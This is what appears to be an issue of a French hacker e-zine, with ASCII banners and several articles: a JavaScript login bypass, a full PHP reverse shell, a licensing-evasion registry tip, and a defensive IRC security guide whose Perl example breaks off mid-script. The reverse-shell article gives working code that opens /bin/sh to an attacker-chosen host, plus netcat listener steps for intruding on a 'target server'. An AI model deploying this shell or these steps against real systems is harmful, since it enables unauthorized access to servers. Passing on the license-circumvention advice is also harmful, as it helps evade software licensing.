estime de vous que vous allez le comprendre..

Si vous avez du temps α investir dans les fondements de la physique moderne,  je vous suggΦre 
½ The elegant univers ╗  .. disponible chez  votre  provider   peer-2-peer  local.. Je  pense 
pas  quÆon  va  vous  en  vouloir de vous instruire par vous  mΩme ;)  Sa  jase  de  concepts 
passΘe/prΘsent/et futur ;)  .. une facon original et  Θmouvante  de  voir  lÆunivers comme un 
tableau  de Dali.. , et on est encore  loin de la collection complΦte ;)




  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |Vous voulez ecrire un article, mais votre chien viens de    \\_  \_ \   \\_ -  : '
 ||`|quittez pour votre blonde? pas le gout de penser par        \_ \   \\_  \_ \ 1   
 || |vous-meme? Nous avons la solution pour vous... ce magnifique  \\_  \_ \   \\_ 1  + 
 || |notepad booster vous est offert gratuitement :                \_ \   \\_  \_ \ 1   
 ||'|                                                                \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|          http://mrgibson.zapto.org/air/filler.php                \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Air Filler 2000 : Instant notepad booster                             ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[11]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ Un affaire de javascript      ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka:                                                           ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[  Liondejuda  ]=\:\ _//     
                                                  \__\________________________/__/ 


              0001001000000100000001001000001000000100010000000000010
              010      __  __           __  _____                 000 
              000     / / / /___ ______/ /_|__  /   _____  ____   001  
              001    / /_/ / __ `/ ___/ //_//_ < | / / _ \/ ___/  010
              000   / __  / /_/ / /__/ ,< ___/ / |/ /  __/ /      000
              000  /_/ /_/\__,_/\___/_/|_/____/|___/\___/_/       001
              010            http://hackever.n0ne.org             000
              0100010001000000100001001000001001000000010000010000100


Voici un script Θcrit en javascript qui permet d'accΘder α une page aprΘs autentification via 
une  fenΘtre  pop  up. Vous allez vous rendres compte de la facilitΘ avec laquel nous pouvons 
passΘes outre cette protection.

Certain Θlements ont ΘtΘs volotairement changΘs. 

Pou r commencer enregistrez la page du site ou se situe le script pour pour ensuite pouvoir y 
travailler hors connexion.


&lt;script language="JavaScript">
function check()
{
var hk=unescape("%45%56%78%63%95%14%75");
if (document value == hk)
{
alert("Mot de passe acceptΘ");
}
else
{
alert ("Erreur du mot de passe");
}
}
&lt;/script>


Le document nous indique clairement la dΘmarche α suivre pour rΘussir une autentification, le 
passe doit avoir la valeur de hk.

Nous allons donc tout simplement remplacer :

alert ("Erreur du mot de passe");

Par:

alert (unescape("%45%56%78%63%95%14%75"));


Ce qui donnera :


&lt;script language="JavaScript">
function check()
{
var hk=unescape("%45%56%78%63%95%14%75");
if (document value == hk)
{
alert("Mot de passe acceptΘ");
}
else
{
alert (unescape("%45%56%78%63%95%14%75"));
}
}
&lt;/script>


Enregistrez les modification et lancez la page dans  un  navigateur  web.  Le  passe  devrait 
s'afficher sur la fenΘtre pop up ou vous alors vous accΘdez directement a la page protΘgΘ.

Je n'ais encore jamais rencontrΘ ce genre de faille α part sur des challenges de javascript .			

Θcrit par LIONDEJUDA.

				(c) Hack3ver - All rights reversed.



  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|Vous runnez windows 2003 illegitimement, vous etes trop     \_ \   \\_  \_ \ 1   
 || |broke pour payer des licenses de Terminal Service? Pas de     \\_  \_ \   \\_ 1  + 
 || |probleme, Effacer periodiquement (a tout les 30 jours) le     \_ \   \\_  \_ \ 1   
 ||'|registre HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSLicensing      \\_  \_ \   \\_  x 
 || |et laisser TS runner en preview mode.                           \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[yet another micro$oft shit, and yet another joke just begining with yet]=\:\  |
  \__\__________________________________________________________________________________/ 


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[12]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ un affaire de reverse shell   ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka:                                                           ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[      __2     ]=\:\ _//     
                                                  \__\________________________/__/ 




Depuis des temps immΘmoriaux, l'homme a essayΘ, a  plusieurs  reprise  (non  sans  peine)  de 
comprendre d'ou venait son ombre...Avec un intΘrΩt beaucoup moindre, voici  une des solutions 
a un problΦme d'un tout autre ordre, j'ai nommΘ: Comment   ouvrir   un reverse shell a partir 
d'un simple script PHP sans avoir a utiliser un logiciel tierce ?

Il  existe  prΘsentement  une  quantitΘ  incroyable de solutions (la majoritΘ, si ce n'est la 
totalitΘ) utilisant des pseudo-shells "one time", je m'explique: un script  PHP exΘcutant par 
exemple shell_exec() et retournant le rΘsultat via une page WEB  dans  un  browser  (tel  que 
Firefox ou IE. Cette solution est trΦs basique  et ne permet  pas l'utilisation de programmes 
plus complexes comme "vi" ou "lynx". JÆentends par complexe le   fait que  les  applications, 
nommΘes prΘcedement, ont la fΓcheuse  tendance  de nΘcessitΘes une interaction  continue avec 
leur utilisateur. Le logiciel ne sort pas aprΦs son exΘcution, mais  nΘcessite  par contre un 
CTRL-C pour terminer. Il y a aussi le fait d'avoir α taper dans un formulaire HTML pour faire 
exΘcuter des commandes qui brise un peu l'ambiance kitch  du  bon  vieux shell en console. Et 
que pourrais bien en penser les voisins?

Pour rΘgler le problΦme il faut donc Ωtre capable de lire le rΘsultat d'une application et de 
lui Θcrire (envoyer du contenu), on parle   alors de transmission  full-duplex.  Le  problΦme 
Θtant  qu'a  priori  PHP n'offrait pas ce genre de fonctionnalitΘs, jusquÆa rΘcemment avec la 
venu de PHP 4.3.0 et 5.

Les nouvelles fonctionnalitΘs sont donc arrivez sous la forme de la fonction "stream_select", 
qui  est  une  copie  conforme  du  bon  vieux  select()  en  C,  on  peut  donc   faire   du 
"IO multiplexing" via PHP. Lire le contenu d'un socket ou d'un processus ne   cause  plus  un 
blocage complet du script PHP :)

Dans le cas ou ces fonctionnalitΘs ne soient pas disponibles, la mΘthode efficace aurait pris 
la forme d'un module PHP programmer en C contenant ce que vous  auriez  bien  voulu   charger 
durant l'exΘcution du script via la fonction "dl()". 

Revenons α nos moutons, voici le code, permettant de faire ce que je viens d'Θcrire, expliquΘ 
ligne par ligne pour vous, les nombreux (Sarcasme)  lecteurs. Les  instructions  sont  justes 
aprΦs le code:

--------------------------------SNIP HERE-------------------------------------------------

<?php




		
	if (!isset($_POST["hostname"])) {					// Cette partie
										// sert simplement
        print "Running: ".phpversion()."&lt;BR>&lt;BR>";				// a afficher un
        die("&lt;HTML>&lt;BODY bgcolor=#efefef>&lt;FORM method=POST>Hostname: 		// formulaire 
		     &lt;INPUT TYPE=text name=hostname value=1.2.3.4>		// demandant le 
                     Port: &lt;INPUT TYPE=text name=port value=10000 size=5>	// hostname
                     &lt;INPUT TYPE=submit value=GO>				// et le port ou
                     &lt;/FORM>&lt;/BODY>&lt;/HTML>");					// envoyer le shell


}

        set_time_limit(0);	// on dΘsactive la limite en temps pour que le shell puisse rouler
				// le temps nΘcessaire.


	// on ouvre un socket vers le host qui recevra le shell
        $socket = fsockopen($_POST["hostname"],$_POST["port"],$errno,$errstr,10);
        if (!$socket) die("Unable to connect");




	// La partie qui suit invoque /bin/sh
	
        $descriptorspec = array(
           0 => array("pipe", "r"),  // STDIN
           1 => array("pipe", "w"),  // STDOUT
           2 => array("pipe", "r") // STDERR
        );


        $process = proc_open('/bin/sh', $descriptorspec, $pipes);

        if (is_resource($process)) { 		// si cest valide
    
        while(1)
        {
                $tocheck = array($pipes[1],$pipes[2],$socket);	// l'array contenant les descriptors
								// a verifier, soit: STDIN,STDERR et SOCKET


		// On multiplexe et on verifie quels sont les descripteurs qui ont besoin d'etre gerer.
		// Quand cela se produit on "forward" les donnees tout simplement.

                $int = stream_select($tocheck,$a =NULL,$b = NULL,0);

                if (in_array($pipes[1],$tocheck)) {
                        $input = fread($pipes[1],4999);
                        if (strlen($input)==0) die("No more joy (Software exists?)");
                        fwrite($socket,$input);
                }

                if (in_array($pipes[2],$tocheck)) {
                        $input = fread($pipes[2],4999);
                        if (strlen($input)==0) die("No more joy");
                        fwrite($socket,$input);
                }

                if (in_array($socket,$tocheck)) {
                        $input = fread($socket,4999);
                        if (strlen($input) == 0) die("No more joy, client left");
                        fwrite($pipes[0],$input);
                }

        }

        }

       die();

?>

--------------------------------SNIP HERE-------------------------------------------------


 
How fulfilling, du beau code PHP. Maintenant passons aux explications: Pour utiliser ce code, 
copier-coller le sur le serveur cible. Installer netcat sur votre PC, si vous etes  sous  BSD 
ou Linux cÆest trΦs standard sinon (pour Windows): 

 ftp://ftp.dbnet.ece.ntua.gr/pub/users/george/nc.exe

Lancer: nc.exe -l -p 31337 (le port 31337 peut Ωtre remplacer par ce  que  vous  voulez).  Le 
serveur  WEB  contenant  votre  shell  script  se  connecter sur votre machine au port voulu. 
Assurez-vous donc de ne pas avoir de firewall qui veut rien savoir de  laisser  la  connexion 
passer.
 
Une  fois  netcat lancer, ouvrer le script PHP via un browser tel que   FireFox, IE, Galleon, 
Epiphany, ou nÆimporte quel autre fork de gecko/mozilla. Dans la page web entrer  votre IP et 
le PORT choisi,  cliquez sur GO et voila, vous avez un beau shell "nobody" trΦs kitch.

A noter que vous ne verrez pas le shell prompt, donc vous devez taper les commandes  dans  le 
vide. J'aurais  bien aimΘ vous offrir mieux, mais netcat est un logiciel beaucoup  trop  dumb 
pour supporter un vrai terminal telnet :) Si quelqu'un met la main sur un telnet listener qui 
a du sens, faite moi signe.

En conclusion, si vous etes encore la, c'est une faτon simple et pratique qui est quand  mΩme 
assez dissimuler de menez a bien votre intrusion. A noter que cela ne fonctionnera pas si:

 - Le serveur est CHROOTED (of course)
 - La version de PHP est trop vieille (<4.3.0)
 - La configuration de php.ini dΘsactive l'utilisation de proc_open ou  
   de fsockopen

En  terminant,  sur  toutes  les  versions < 5.0 il semblerait que STDERR n'est pas rediriger 
convenablement. DΘtail mineur, mais τa peut Ωtre pratique d'avoir les erreurs.

Sur ce, bon plaisir.

                                               __2.psychadelic-toasters-dont-like-white-bread



  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |&lt;ReD|WoLf> Quelqu'un s'y connais en hack SVP                  \\_  \_ \   \\_ 1  + 
 || |&lt;ReD|WoLf> je vient de me faire freezzer mes 2 compte hotmail \_ \   \\_  \_ \ 1   
 ||'|&lt;ReD|WoLf> 1 payer et 1 gratuit                                 \\_  \_ \   \\_  x 
 || |&lt;ReD|WoLf> alors quelqu'un peut m'aider SVP                     \_ \   \\_  \_ \  `
 || |* ReD|WoLf has left #hack.fr (Fuck les hacker)                    \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Pour de l'aide, demander un hacker de #hack.fr...                     ]=\:\  |
  \__\__________________________________________________________________________________/ 





  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[13]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ SΘcuritΘ sur IRC            ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: spa pcq c'est pas leet qui faut Ωtre stupide              ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[    Ninja     ]=\:\ _//     
                                                  \__\________________________/__/ 
                               SecuritΘ sur IRC

RΘsumΘ

   Petit text qui rΘflΦte les mΘthodes que j'utilisent afin de me "protΘger" sur les serveurs 
IRC. Je ne suggΦre pas que mes mΘthodes sont parfaites ni efficaces, mais disons qu'elles ont 
faites leurs preuvent jusqu'α maintenant.  Cetainnes  de  ces  mΘthodes  doivent  modifier le 
comportement du client IRC  utilisΘ, j'ai donc fourni, lorsque nΘcessaire, un exemple du code 
α utiliser.

Table des matiΦres
   1. Introduction
   2. Pourquoi
   3. Comment
      3.1 Rendre anonyme notre client
      3.2 Auto-Get, Auto-Send, Auto-Chat
      3.3 Securiser ses scripts
      3.4 Trojans, virus, vers
      3.5 Proxy, Wingate, Bouncer
      3.6 La commande 'mode +x'
      3.7 Serveur IRC sΘcuritaire (encryption SSL)
      3.8 RΦgles de base
   4. Conclusion

1. Introduction

   Imaginons la situation suivante: votre systΦme est vulnΘrable. Une personne   malveillante 
   peut donc avoir un accΦs complet α votre ordinateur. Celα veut  dire  qu'il  peut faire ce 
   qu'il lui plait: AccΦder α vos fichiers, scanner pour  d'autre  systΦme  α attaquer, faire 
   des attaque de denis de service (DoS) sur d'autre systΦme, effacer vos fichiers, etc.

   MΩme  si  vous  n'avez  aucuns  fichiers  qui  vaut  la peine d'Ωtre protΘgΘ, les systΦmes 
   vulnΘrables sont souvant utilisΘs pour lancer  des  attaques  sur  d'autre  systΦme,  vous 
   fesant parraitre comme l'auteur de ces attaques et  vous  expose  aux  actions criminel et 
   civil.

   De nos jours, les attaques α  grande  Θchelle  sont  fondΘes  sur  un  rΘseaux de systΦmes 
   vulnΘrable, car les systΦmes des utilisateurs moyen sont presque toujours mal protΘgΘs. En 
   prenant le temps de sΘcuriser votre systΦme  contre  les  intrusions,  et  en   rΘagissant 
   rapidement et correctement au cas o∙ votre  systΦme  soit compromis, vous vous prΘvenez de 
   devenir un participant non-solicitΘ pour ces attaques.

2. Pourquoi

   Je  suis  sure  que vous comprenez l'importance de sΘcuriser votre systΦme  contre  toutes 
   formes d'intrusions. Mais peut-Ωtre vous ne voyez pas vraiment  l'utilitΘ  de  la sΘcuritΘ 
   sur IRC, ou vous vous demandez peut-Ωtre en quoi consiste la sΘcuritΘ sur IRC. Laissez moi 
   vous expliquer pourquoi, selon moi,  il  est important de tenir compte de la sΘcuritΘ lors 
   de vos session de bavardages sur les rΘseaux IRC.

   Supposons que vous avez passΘ des heures α configurer  votre  systΦme  et  ces  diffΘrents 
   programmes afin que votre systΦme soit protΘgΘ. Vous vous  Ωtes  arrangΘ  pour   qu'aucune 
   informations sensibles, qui puissent amener votre  systΦme  α Ωtre vulnΘrable, ne puissent 
   Ωtre obtenu par une personne  malveillante.  Ces  informations  peuvent  Ωtre  le  type de 
   systΦme d'exploitation  que vous utilisΘ et son numΘro de version, les diffΘrents services 
   web (httpd, ftpd, sshd, etc.) ainsi que leur numΘro de version, etc. Mais vous  utilisΘ un 
   vulgΦre  client  IRC  qui vous semble tout α fait inoffensif et vous ne vous en prΘoccupez 
   pas. Eh bien!, tout vos efforts ont ΘtΘ pratiquement  fait  en vain, puisque ce client est 
   susceptible de donner certainnes  des informations que vous avez pris la peines de cacher. 
   De plus, il est  possible  que ce vulgΦre client est une faille de sΘcuritΘ qui permette α 
   une personne d'exΘcuter du code arbitraire, et ainsi prendre contr⌠le de votre ordinateur.

3. Comment

   3.1 Rendre anonyme notre client

      MalgrΘ le fait que le protocol dΘfinie dans le RFC-1459 ne fait aucunement  allusion au 
      CTCP (Client To Client Protocol), la majoritΘ des client IRC  on  une implΘmentation de 
      ce dernier. MΩme si ce protocol n'a jamais ΘtΘ  officiellement  standardisΘ,  un effort 
      collectif de diffΘrents  auteurs  de  client  IRC on permits au protocol de survivre au 
      temps et de coller α un standard officieux.

      Il est trΦs facile de determiner quel client vous utilisez,  ainsi que sa version et le 
      systΦme d'exploitation que vous utilisez. On  peut  donc trouver aisΘment une faille de 
      securitΘ soit pour le client, soit  pour  le systΦme d'exploitation. Il est entendu que 
      d'autres mΘthodes  peuvent  Ωtre  utilise  pour  trouver  quel  client  et/ou   systΦme 
      d'exploitation  vous  utilisez,  mais  elles ne sont pas dans "scope" de ce texte. Nous
      devons donc empΩcher le client de divulger des informations qui pourraient  compromette 
      votre securitΘ ou fausser ces derniΦres afin de brouiller vos traces. L'attaqueur devra 
      donc redoubler  d'effort  afin  d'obtenir  ces  informations.  Voici  les   differentes 
      commandes CTCP que le standard officieux recommande au client d'implementer:

      VERSION,
         Cette requΩte va donner α l'initiateur des informations particuliaires  α  propos du 
         client utilisΘ par le rΘcepteur. Une requΩte valide  ne  possΦdera  pas  d'argument. 
         Elle rΘgnΘrera une rΘponse dans la forme  gΘnΘrale ci-dessous, avec trois champ dans 
         la rΘponse:

            Champ1: Nom du client et sa version
            Champ2: Nom du systΦme d'exploitation et sa version
            Champ3: Contact de l'individu/organisation responsable du client

         Les champs doivent Ωtre combinΘ comme suit:

             &lt;marker>VERSION &lt;field1> &lt;field2> &lt;field3>&lt;marker>

         Ex.:
            mIRC
               mIRC32 v5.91 K.Mardam-Bey
               mIRC v6.02 Khaled Mardam-Bey
               mIRC v6.03 Khaled Mardam-Bey
               mIRC v6.11 Khaled Mardam-Bey
               mIRC v6.12 Khaled Mardam-Bey
               mIRC v6.14 Khaled Mardam-Bey
               mIRC v6.16 Khaled Mardam-Bey
            x-chat
               xchat 1.8.9 Linux 2.6.4-ALIZEE [i686/251MHz]
               xchat 2.4.1 Windows 5.1 [i1586/2,79GHz]
               xchat 2.4.1 Linux 2.6.8-1-386 [i686/908.62MHz]
            BitchX
               BitchX-1.0c19+ by panasync - Linux 2.4.20 : Keep it to yourself!
            KVIrc
               KVIrc 3.0.1 'System Virtue' - 2004.03.24 -
                  build Sun Jan 16 04:20:59 UTC 2005 - i686-cefikoprstAGST
            IRSSI
               irssi v0.8.9 - running on Linux i686
               irssi v0.8.9 - running on NetBSD i386
            Eggdrop
               eggdrop v1.4.4
               eggdrop v1.6.16

      PING,

         Cette requΩte α comme but de dΘterminer le dΘlai du voyage que prendra un message de 
         l'initiateur au destinataire  et  de  nouveau  α  l'initiateur.  Le destinataire est 
         requis  de  renvoyer  une  reproduction exact de l'argument reτu, sans modification. 
         Chaque client dΘfinira  son propre format pour l'argument de 16 octets. Les requΩtes 
         avec  des  arguments  plus  long  que  16  caractΦres devraient Ωtre silencieusement 
         ignorΘs.

         La rΘponse sera du format suivant:

             &lt;marker>PONG &lt;arg>&lt;marker>

      ACTION,

         Cette requΩte est utlisΘ afin de fournir une mΘthode alternative de communiquer avec 
         un autre utilisateur ou un canal. Le texte devrait  Ωtre traite de faτon similaire α 
         celui d'une requΩte PRIVMSG tel que dΘfini dans le RFC1459.

         Aucune rΘponse n'est gΘnΘrΘ suite a cette requΩte.

      Les commandes CTCP suivante ne sont plus supportΘ par la majoritΘ,  sinon  la totalitΘ, 
      des clients IRC actuel mΩme si il sont "require" selon le protocol officieux:
      
         CLIENTINFO, (seul BitchX semble encore supporter cette commande)
            Cette requΩte est utilisΘ pour connaεtre les capacitΘs du client  utilisΘ  par le 
            rΘcepteur. La rΘponse sera une liste de commandes  valide, reconnu par le client, 
            sΘparrΘ par des espaces.  L'implΘmentation  courrante de cette commande permet de 
            passer  en  argument  une  commande  supportΘ  par  le  client  pour  obtenir  de
            l'informations supplΘmentaire sur cette derniΦre.

      La seul commande CTCP qui nous intΘresse dans ce cas ci est VERSION,  qui  nous  permet 
      d'obtenir  des  informations  en  rapport  avec  le  client  utilisΘ  et  le    systΦme 
      d'exploitation.  Notez  aussi que certains scripts disponible  pour  certains   clients 
      modifient la rΘponse du CTCP VERSION, souvant en  votre  faveur,  mais  certains  donne 
      encore plus d'informations que ce que le client aurait fourni.

      Comme X-Chat et BitchX permettent de modifier les requΩte CTCP  VERSION  et  autres  de 
      faτon relativement simple, enfin je crois, je ne  fournirai  pas  de  script  pour  ces 
      derniers. Voici donc, un script Θcrit pour mIRC afin  de  fausser la rΘponse suite α un 
      CTCP VERSION.
      =--------------------CUT HERE-------------------=
      ; Puisque mIRC α son CTCP VERSION reply hardcoded, nous ne pouvons pas
      ; simplement utiliser le code suivant:
      ;    ctcp &*:VERSION:*:/ctcpreply $nick VERSION BlaBla | /halt
      ; Alors nous devons faire un petit "hack" pour arriver a notre fin.
      ;
      ; PremiΦrment, lors de la connexion, nous allons crΘer une fenΩtre debug
      ; qui ne serait qu'accesible par la "windows list" de mIRC α partir du
      ; menu "Windows" (l'option -h). Cette fenΩtre aura comme nom
      ; @Debug&lt;server_connection_id>, donc aucun conflit si vous Ωtes connectΘ
      ; sur plus d'un server α la fois.
      on *:connect:{
        .window -h $+(@Debug,$cid)
      ; Ensuite nous ordonnons α mIRC d'appler la fonction Parse_Debug, α chaque
      ; message que le serveur lui envois et vise versa, avec comme argument le
      ; message "raw", donc dans le format spΘcifier par le RFC1459. Le rΘsultat
      ; retournΘ par la fontion Parse_Debug serait affichΘ dans nos fenΩtres
      ; debug. En fait, la fontion ne retournera rien.
        .debug -i $+(@Debug,$cid) Parse_Debug
      ; Ensuite nous ignorons les requΩte ctcp venant de n'importe qui seulement
      ; pour la connection courante.
        .ignore -t *!*@*
      }
      ; Voici l'alias Parse_Debug qui va nous permettre de voir lorsque des
      ; requΩte CTCP VERSION nous sont envoyΘ, et gΘnΘrer notre propre rΘponse.
      ; Voici α quoi ressemblera un requΩte CTCP VERSION format "raw":
      ;    <- :Ninja|tux!~ufmow@66.201.225.99 PRIVMSG Ninja|code :☺VERSION☺
      ; Veillez noter que le '<-' est rajouter par mIRC pour qu'il soit plus
      ; claire si le message arrive du serveur ou si c'est un message que nous
      ; envoyons au serveur. Les deux caractΦres bizzard entourant le mot
      ; VERSION sont en fait des dΘlimiteurs, le code ASCII de ce caratΦre est:
      ; DECIMAL | OCTAL | HEXA | CARAT╚RE | DESCRIPTION
      ;    1        1      01       SOH     Start of header
      alias Debug_Parse {
        tokenize 58 $1-
        if ($gettok($3,1,1) == VERSION) {
          var %my_nickreply $gettok($2,1,33)
          var %my_ctcpecho $+($chr(91),[ [ %my_nickreply ] ],$chr(32),VERSION,$chr(93))
          echo $color(Ctcp text) -a %my_ctcpecho
          .ctcpreply %my_nickreply VERSION Why you need to know?
        }
      }
      ; Simple question de sanitΘ, pour Θviter les risques de multiplication de
      ; fenΩtres @Debug&lt;N>, losque vous perdez la connection avec le serveur
      ; nous arrΩtons le debug et fermons la fenΩtre. Et puis pour ne pas
      ; remplir inutilement la ignore list ou risquer de foutre le bordel dans
      ; votre "ignore list", nous y enlΦverons notre entrΘe.
      on *:disconnect:{
        .debug -c off
        .ignore -tr *!*@*
      }
      on *:exit:{
        ; pas besoin d'arrΩter le debug puisque nous quittons, mIRC s'en occupe
        ; automatiquement.
        ; Comme nous quittons TOUS les serveurs, nous enlevons TOUS les entrΘes
        ; que nous avons crΘΘ (-w)
        .ignore -twr *!*@*
      }
      =--------------------CUT HERE-------------------=

   3.2 Auto-Get, Auto-Send, Auto-Chat

      Certains  client  IRC  offrent  des  options qui permettent l'envoie et la reception de 
      fichiers  automatiquement,  ou  de  dΘmarrer  des  sessions   de    bavardage    (chat) 
      automatiquement. Si ces  options  sont  activΘes,  elles  permettent  a  n'importe  qui 
      d'obtenir votre adresse ip. De plus, il se peut  qu'un client soit vulnΘrable α un type 
      d'attaque relier α l'envoie et α la rΘception de fichier ou de session de bavardage, et 
      l'automatisation des ces dispositifs vous rend un cible idΘale.

      Il  est  prΘfΘrable  d'utiliser  des  "trigger"  qui  vont  former un pseudo-mechanisme 
      d'identification pour ensuite initier l'envoie/reception de fichiers ou de dΘmarrer une 
      session de bavardage (chat). Une sorte de vΘrification sanitaire afin d'Θviter certains 
      type d'attaques. Ces  "trigger"  peuvent  Ωtre  simplement  une  requΩte  (ou  suite de 
      requΩtes) CTCP, un PRIVMSG, un NOTICE, etc.
      
      Voici un exemple simple, en PERL, Θcrit pour X-Chat. Le trigger consiste  en une simple 
      requΩte CTCP.
      =--------------------CUT HERE-------------------=
      #!/usr/bin/perl

      use strict;
      use warnings;

      # Variables
      my $PKG     = __PACKAGE__;
      my $NAME    = "DCC Trigger Protection";
      my $VERSION = "1.0";
